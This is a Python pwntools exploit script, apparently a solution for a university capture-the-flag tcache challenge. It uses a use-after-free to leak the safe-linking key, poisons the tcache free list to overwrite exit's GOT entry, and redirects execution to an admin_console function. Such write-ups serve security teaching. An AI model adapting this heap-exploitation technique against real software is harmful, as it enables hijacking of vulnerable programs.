#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
        #terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-tcache-1.chals.io", 443, ssl=True, sni="cse4850-tcache-1.chals.io")
    else:
        return process(binary)

def create(p, index, data):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"1")
    p.recvuntil(b"use >>>")
    p.sendline(index)
    p.recvuntil(b">>>")
    p.sendline(data)

def edit(p, index, data):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"2")
    p.recvuntil(b"edit >>>")
    p.sendline(index)
    p.recvuntil(b"song: ")
    leak = p.recvline().strip()
    print(leak)
    p.recvuntil(b">>>")
    p.sendline(data)

    return leak

def delete(p, index):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"3")
    p.recvuntil(b"delete >>>")
    p.sendline(index)

def exploit(p,e):
    create(p, b"0", b"A" * 15)
    create(p, b"1", b"B" * 15)
    delete(p, b"0")
    delete(p, b"1")
    leak = edit(p, b"0", b"C"*15)
    xor_value = u64(leak.ljust(8, b"\x00"))
    pointer = e.got["exit"] ^ xor_value
    print(hex(xor_value))
    edit(p, b"0", b"A" * 0x78 + p64(0x91) + p64(pointer))
    create(p, b"0", p64(pointer))
    create(p, b"1", p64(e.sym["admin_console"]))

    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
